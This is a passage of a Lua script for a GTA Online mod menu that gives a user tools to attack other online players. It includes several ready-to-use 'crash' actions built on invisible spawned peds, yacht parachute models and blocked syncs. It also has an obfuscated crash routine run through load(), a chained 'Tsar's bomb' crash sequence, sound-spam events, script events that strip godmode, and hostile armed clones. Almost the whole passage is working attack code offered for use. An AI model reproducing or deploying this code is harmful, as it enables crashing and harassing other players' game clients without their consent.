            ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            util.yield(200)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
        entities.delete_by_handle(mdl)
        entities.delete_by_handle(mdl2)
        entities.delete_by_handle(mdl3)
        entities.delete_by_handle(mdl4)
        entities.delete_by_handle(veh_mdl)
        entities.delete_by_handle(veh_mdl2)
    end)

    -- This is a Prisuhm crash fixed by me <3

    local krustykrab = menu.list(twotake, "Mr. Krabs", {}, "Spectating is risky, watch out: works on 2T1 users")

    local peds = 5
    menu.slider(krustykrab, "Number of spatulas", {}, "sends spatules ah~", 1, 45, 1, 1, function(amount)
        util.toast(players.get_name(player_id).. " Has spatulas being sent to him/her")
        peds = amount
    end)

    local crash_ents = {}
    local crash_toggle = false
    menu.toggle(krustykrab, "Number of spatulas", {}, "Spectating is risky, watch out.", function(val)
        util.toast(players.get_name(player_id).. " Has spatulas being sent to him/her")
        local crash_toggle = val
        ryze.BlockSyncs(player_id, function()
            if val then
                local number_of_peds = peds
                local ped_mdl = util.joaat("ig_siemonyetarian")
                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                local ped_pos = players.get_position(player_id)
                ped_pos.z += 3
                ryze.request_model(ped_mdl)
                for i = 1, number_of_peds do
                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                    crash_ents[i] = ped
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.SET_ENTITY_VISIBLE(ped, false)
                end
                repeat
                    for k, ped in crash_ents do
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_BBQ", 0, false)
                    end
                    for k, v in entities.get_all_objects_as_pointers() do
                        if entities.get_model_hash(v) == util.joaat("prop_fish_slice_01") then
                            entities.delete_by_pointer(v)
                        end
                    end
                    util.yield_once()
                    util.yield_once()
                until not (crash_toggle and players.exists(player_id))
                crash_toggle = false
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            else
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            end
        end)
    end)

    local nmcrashes = menu.list(twotake, "More model crashes", {}, "")

    menu.action(nmcrashes, "Yatch V1", {"bigyachtyv1"}, "Crash event (A1:EA0FF6AD) sending prop yatch.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        ryze.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(nmcrashes, "Yatch V2", {"bigyachtyv2"}, "Crash event (A1:E8958704) sending prop yacht001.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy001")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        ryze.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(nmcrashes, "Yatch V3", {"bigyachtyv3"}, "Crash event (A1:1A7AEACE) sending prop yacht002.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy002")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        ryze.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(nmcrashes, "Yatch V4", {"bigyachtyv4"}, "Crash event (A1:408D3AA0) sending prop apayacht.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_mp_apa_yacht")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        ryze.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(nmcrashes, "Yatch V5", {"bigyachtyv5"}, "Crash event (A1:B36122B5) sending the prop yachtwin.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_mp_apa_yacht_win")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        ryze.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

    menu.divider(crashes, "(Past Cwash)") -- Thx to every single stand developper that worked on this <3

    local c
    c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local kitteh_hash = util.joaat("a_c_cat_01")
    ryze.request_model_load(kitteh_hash)

    local crash_tbl = {
        "SWYHWTGYSWTYSUWSLSWTDSEDWSRTDWSOWSW45ERTSDWERTSVWUSWS5RTDFSWRTDFTSRYE",
        "6825615WSHKWJLW8YGSWY8778SGWSESBGVSSTWSFGWYHSTEWHSHWG98171S7HWRUWSHJH",
        "GHWSTFWFKWSFRWDFSRFSRTDFSGICFWSTFYWRTFYSSFSWSYWSRTYFSTWSYWSKWSFCWDFCSW",
    }

    local crash_tbl_2 = {
        {17, 32, 48, 69},
        {14, 30, 37, 46, 47, 63},
        {9, 27, 28, 60}
    }

    menu.action(crashes, "Cwash Pwayer", {"cwash"}, "I dont know if stils cwashes the pwayer.", function()
        if player_id == players.user() then 
            util.toast('nya nya! you cant cwash youwself.. >_<')
            return 
        end

        if player_id == players.get_host() then 
            util.toast('nya nya.. unfowtunatewy, u cannot cwash the host >_<')
            return
        end

        local cur_crash_meth = ""
        local cur_crash = ""
        for a,b in pairs(crash_tbl_2) do
            cur_crash = ""
            for c,d in pairs(b) do
                cur_crash = cur_crash .. string.sub(crash_tbl[a], d, d)
            end
            cur_crash_meth = cur_crash_meth .. cur_crash
        end

        local crash_keys = {"NULL", "VOID", "NaN", "127563/0", "NIL"}
        local crash_table = {109, 101, 110, 117, 046, 116, 114, 105, 103, 103, 101, 114, 095, 099, 111, 109, 109, 097, 110, 100, 115, 040}
        local crash_str = ""

        for k,v in pairs(crash_table) do
            crash_str = crash_str .. string.char(crash_table[k])
        end

        for k,v in pairs(crash_keys) do
            print(k + (k*128))
        end

        c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        ryze.request_model_load(kitteh_hash)
        local kitteh = entities.create_ped(28, kitteh_hash, c, math.random(0, 270))
        -- i pwoimise no kittehs are hurt...
        AUDIO.PLAY_PAIN(kitteh, 7, 0)
        menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(players.user()))
        ryze.cwash_in_progwess()
        util.yield(500)
        for i=1, math.random(10000, 12000) do
        end
        local crash_compiled_func = load(crash_str .. '\"' .. cur_crash_meth .. PLAYER.GET_PLAYER_NAME(player_id) .. '\")')
        pcall(crash_compiled_func)
        util.toast('bye bye! nya nya >_<')
    end)

    local cwcred = menu.list(crashes, "Credits", {}, "")

    menu.action(cwcred, "Pwisuhm", {}, "Helped in this cwash >.<", function() end)
    menu.action(cwcred, "IcyPhoenix", {}, "Helped in this cwash >.<", function() end)
    menu.action(cwcred, "LanceScwipt", {}, "Helped in this cwash >.<", function() end)
    menu.action(cwcred, "Aaron", {}, "Helped in this cwash >.<", function() end)
    menu.action(cwcred, "And evewy one else.", {}, "Helped in this cwash >.<", function() end)
    

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

    menu.divider(crashes, "(Powerfull)")

    if menu.get_edition() >= 1 then 
        menu.action(crashes, "Tsar's bomb", {"tsarbomba"}, "A pc demanding crash, if you dont have a good pc, i don't recommend using it (Unblockable uwu)", function()
            --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
            menu.trigger_commands("anticrashcamera on")
            menu.trigger_commands("potatomode on")
            menu.trigger_commands("trafficpotato on")
            util.toast("Iniciando...")
            util.toast("Poor guy")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            util.yield(2500)
            menu.trigger_commands("crashv1"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("crashv2"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv5"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv6"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv7"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv8"..players.get_name(player_id))
            util.yield(700)
            menu.trigger_commands("crashv9"..players.get_name(player_id))
            util.yield(2000)
            menu.trigger_commands("crash"..players.get_name(player_id))
            util.yield(1800)
            util.toast("wait until everything cleans up by itself...")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            menu.trigger_commands("rcleararea")
            menu.trigger_commands("potatomode off")
            menu.trigger_commands("trafficpotato off")
            util.yield(8000)
            menu.trigger_commands("anticrashcamera off")
        end)
    end

    if menu.get_edition() >= 2 then
        menu.action(crashes, "Tsar's bomb V2", {"tsarbomba"}, "A pc demanding crash, if you dont have a good pc, i don't recommend using it (Unblockable uwu) \n(It needs to regulate in order to work/Posible Overload)", function()
            menu.trigger_commands("anticrashcamera on")
            menu.trigger_commands("potatomode on")
            menu.trigger_commands("trafficpotato on")
            util.toast("Iniciando...")
            util.toast("Poor man")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            util.yield(2500)
            menu.trigger_commands("crashv1"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("crashv2"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv5"..players.get_name(player_id))
            util.yield(500)
            util.yield(2000)
            menu.trigger_commands("crash"..players.get_name(player_id))
            util.yield(200)
            menu.trigger_commands("ngcrash"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("footlettuce"..players.get_name(player_id))
            util.yield(700)
            menu.trigger_commands("steamroll"..players.get_name(player_id))
            menu.trigger_commands("choke"..players.get_name(player_id))
            util.yield(200)
            menu.trigger_commands("flashcrash"..players.get_name(player_id))
            util.yield(1800)
            util.toast("wait until everything cleans up by itself...")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            menu.trigger_commands("rcleararea")
            menu.trigger_commands("potatomode off")
            menu.trigger_commands("trafficpotato off")
            util.yield(8000)
            menu.trigger_commands("anticrashcamera off")
        end)
    end

    if menu.get_edition() >= 3 then
        menu.action(crashes, "Special Tsar's bomb (Model)", {"tsarbomba5"}, "A pc demanding crash, if you dont have a good pc, i don't recommend using it (Unblockable uwu) \n(It needs to regulate in order to work/Posible Overload)", function()
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            menu.trigger_commands("anticrashcamera on")
            menu.trigger_commands("potatomode on")
            menu.trigger_commands("trafficpotato on")
            util.toast("Iniciando...")
            util.toast("Poor guy")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            util.yield(2500)
            menu.trigger_commands("crashv27"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv18"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv12"..players.get_name(player_id))
            util.yield(820)
            menu.trigger_commands("crashv10"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv5"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv1"..players.get_name(player_id))
            util.yield(720)
            menu.trigger_commands("crashv13"..players.get_name(player_id))
            util.yield(720)
            menu.trigger_commands("crashv14"..players.get_name(player_id))
            util.yield(2800)
            menu.trigger_commands("crash"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("ngcrash"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("footlettuce"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("steamroll"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("choke"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("flashcrash"..players.get_name(player_id))
            util.yield(200)
            util.yield(400)
            menu.trigger_commands("smash"..players.get_name(player_id))
            if PLAYER.GET_VEHICLE_PED_IS_IN(ped, false) then
                menu.trigger_commands("slaughter"..players.get_name(player_id))
            end
            util.yield(1500)
            util.toast("wait until everything cleans up by itself...")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            menu.trigger_commands("rcleararea")
            menu.trigger_commands("potatomode off")
            menu.trigger_commands("trafficpotato off")
            util.yield(8000)
            menu.trigger_commands("anticrashcamera off")
        end)
    end

    --local kicks = menu.list(malicious, "Kicks", {}, "")
    --local especialev = menu.list(malicious, "Special events", {}, "Recently discovered events. \nDon't abuse them.")


    local scriptev = menu.list(malicious, "Earrapes", {}, "Script caused events. \nPlayers with a bought mod menu can detect you.")

    menu.action(scriptev, "Loser", {}, "It will trigger some events that will make everyone hear the sound. \nPlayers with a bought mod menu can detect you.", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "LOSER", pc.x, pc.y, pc.z, "HUD_AWARDS", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    
    menu.action(scriptev, "Transition", {}, "It will trigger some events that will make everyone hear the sound. \nPlayers with a bought mod menu can detect you.", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "1st_Person_Transition", pc.x, pc.y, pc.z, "PLAYER_SWITCH_CUSTOM_SOUNDSET", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    menu.action(scriptev, "Respawn", {}, "It will trigger some events that will make everyone hear the sound. \nPlayers with a bought mod menu can detect you.", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Hit", pc.x, pc.y, pc.z, "RESPAWN_ONLINE_SOUNDSET", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    menu.action(scriptev, "Air defenses", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pc.x, pc.y, pc.z, "DLC_sum20_Business_Battle_AC_Sounds", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    local antimodder = menu.list(malicious, "Anti-Modder", {}, "")
    local kill_godmode = menu.list(antimodder, "Kill player with godmode", {}, "")
    menu.action(kill_godmode, "Stun", {""}, "Works on menus that use :", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 99999, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
    end)

    menu.list_action(kill_godmode, "Push Them", {}, "", {"Khanjali", "APC"}, function(index, veh)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local vehicle = util.joaat(veh)
        ryze.request_model(vehicle)

        switch veh do
            case "Khanjali":
            height = 2.8
            offset = 0
            break
            case "APC":
            height = 3.4
            offset = -1.5
            break
        end

        if TASK.IS_PED_STILL(ped) then
            distance = 0
        elseif not TASK.IS_PED_STILL(ped) then
            distance = 3
        end

        local vehicle1 = entities.create_vehicle(vehicle, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, offset, distance, height), ENTITY.GET_ENTITY_HEADING(ped))
        local vehicle2 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle3 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle4 = entities.create_vehicle(vehicle, pos, 0)
        local spawned_vehs = {vehicle4, vehicle3, vehicle2, vehicle1}
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(5000)
        for i = 1, #spawned_vehs do
            entities.delete_by_handle(spawned_vehs[i])
        end
    end)   

    player_toggle_loop(antimodder, player_id, "Remove godmode", {}, "A of menus block it", function()
        util.trigger_script_event(1 << player_id, {800157557, player_id, 448051697, math.random(0, 9999)})
    end)

    player_toggle_loop(antimodder, player_id, "Anti-godmode gun", {}, "", function()
        for _, player_id in ipairs (players.list(true, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            if PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(players.user(), ped) and players.is_godmode(player_id) then
                util.trigger_script_event(1 << player_id, {800157557, player_id, 448051697, math.random(0, 9999)})
            end
        end
    end)

    menu.action(trolling, "Send to jail", {}, "", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false)
        menu.trigger_commands("givesh " .. players.get_name(player_id))
        menu.trigger_commands("summon " .. players.get_name(player_id))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        util.yield(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
    end)

    menu.action(trolling, "Kill in interior", {}, "Works :b", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
    
        for i, interior in ipairs(interior_stuff) do
            if ryze.get_interior_player_is_in(player_id) == interior then
                util.toast("Player is not on interior grounds. D:")
            return end
            if ryze.get_interior_player_is_in(player_id) ~= interior then
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
            end
        end
    end)

    local function GiveWeapon(attacker)
        if (weapon0 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(unarmed, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, unarmed, 1, false, true)
        elseif (weapon1 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(machete, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, machete, 1, false, true)
        elseif (weapon2 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(pistol, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, pistol, 1, false, true)
        elseif (weapon3 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(stungun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, stungun, 1, false, true)
        elseif (weapon4 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(atomizer, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, atomizer, 1, false, true)
        elseif (weapon5 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(shotgun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, shotgun, 1, false, true)
        elseif (weapon6 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(sniper, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, sniper, 1, false, true)
        elseif (weapon7 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(microsmg, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, microsmg, 1, false, true)
        elseif (weapon8 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(minigun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, minigun, 1, false, true)
        elseif (weapon9 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(RPG, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, RPG, 1, false, true)
        elseif (weapon10 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(hellbringer, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, hellbringer, 1, false, true)
        elseif (weapon11 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(railgun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, railgun, 1, false, true)
        end
    end

    local function setAttribute(attacker)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 38, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 5, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 0, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 12, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 22, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 54, true)
        PED.SET_PED_COMBAT_RANGE(attacker, 4)
        PED.SET_PED_COMBAT_ABILITY(attacker, 3)
    end

    local pclpid = {}

    menu.action(trolling, "Clone", {}, "Clones the player.", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        aclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0) --spawn clone
        PED.CLONE_PED_TO_TARGET(p, aclone)
        GiveWeapon(aclone)
        setAttribute(aclone)
        TASK.TASK_COMBAT_PED(aclone, p, 0, 16)
        if (isImmortal == true) then
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(aclone, false)
        end
    end)

    menu.action(trolling, "Teleport to the backrooms", {}, "Teleport a player to the backrooms", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p, true)
        local defx = c.x
        local defy = c.y 
        local defz = c.z
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            STREAMING.REQUEST_MODEL(floorbr)
            while not STREAMING.HAS_MODEL_LOADED(floorbr) do
                STREAMING.REQUEST_MODEL(floorbr)
                util.yield()
            end
            STREAMING.REQUEST_MODEL(wallbr)
            while not STREAMING.HAS_MODEL_LOADED(wallbr) do
                STREAMING.REQUEST_MODEL(wallbr)
                util.yield()
            end
            RequestControl(veh)
            local success, floorcoords
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                util.yield()
            until success
            c.z = floorcoords - 100
            ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, c.z, false, false, false, false)

            local c = ENTITY.GET_ENTITY_COORDS(p)
            local defz = c.z
            c.z = defz - 2
